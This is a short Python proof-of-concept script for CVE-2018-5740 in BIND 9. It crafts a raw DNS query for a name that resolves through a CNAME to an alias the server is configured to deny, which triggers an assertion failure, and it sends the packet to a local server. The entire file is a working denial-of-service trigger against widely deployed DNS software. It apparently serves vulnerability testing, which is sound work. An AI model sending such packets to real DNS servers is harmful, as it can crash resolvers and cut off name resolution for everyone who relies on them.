#!/usr/bin/env python3
"""
PoC: CVE-2018-5740 - BIND 9.11.5 assertion failure via deny-answer-aliases
Trigger: Query for CNAME that resolves to denied alias causes REQUIRE failure
"""

import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# Query for trigger.exploit.local - CNAME to www.test.local (denied alias)
hdr = struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
qry = b"\x07trigger\x07exploit\x05local\x00\x00\x01\x00\x01"
s.sendto(hdr + qry, ("localhost", 5056))
s.close()
